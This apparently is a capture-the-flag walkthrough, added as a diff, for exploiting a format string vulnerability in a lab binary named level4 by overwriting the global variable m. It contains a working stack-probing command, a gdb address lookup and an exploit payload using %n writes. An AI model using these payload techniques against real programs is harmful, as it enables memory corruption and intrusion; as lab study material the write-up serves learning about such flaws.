@@ -1,0 +1,60 @@
+Walkthrough: Exploiting Format String Vulnerability (level4)
+
+Objective:
+Exploit a format string vulnerability to overwrite a specific memory address (the global variable `m`) with a chosen value.
+
+---
+
+Step 1: Discover Position of Input on the Stack
+
+We need to determine the position of our input on the stack relative to the format string.
+
+Command used:
+    python -c 'print ("0000 " + "%x " * 20)' | ./level4
+
+Explanation:
+- "0000 " is a known marker.
+- "%x " will print values from the stack.
+
+By looking at the output, you can identify which position corresponds to "0000" — this tells us where our controlled input appears on the stack.
+
+In this case:
+    "0000" appears at the 12th position (i.e., %12$x or %12$n).
+
+---
+
+Step 2: Locate the Address of the Global Variable `m`
+
+We want to overwrite the global integer variable `m`, so we need its memory address.
+
+Using gdb:
+    (gdb) run
+    [Let the program start and exit]
+    (gdb) p &m
+    $1 = (<data variable, no debug info> *) 0x8049810
+
+This is the address in memory we aim to write to.
+
+---
+
+Step 3: Craft the Exploit Payload
+
+The goal is to write a specific value (e.g., a large integer) into address `0x8049810` using the format string vulnerability.
+
+Payload structure:
+- Begin with the address we want to overwrite (in little endian): \x10\x98\x04\x08
+- Then use a format string to pad the output and write a value using %n
+- %12$n writes the number of bytes printed so far into the 12th parameter on the stack, which we control
+
+Exploit command:
+    python -c 'print ("\x10\x98\x04\x08" + "%16930112c%12$n")' | ./level4
+
+Explanation:
+- \x10\x98\x04\x08 is the target address.
+- %16930112c pads the output to 16930112 characters, which is the value that will be written.
+- %12$n writes this value to the address we placed at the 12th stack position.
+
+---
+
+Result:
+The integer `m` is overwritten in memory. If this triggers a condition (like checking if m == specific value), the program proceeds accordingly, completing the challenge.
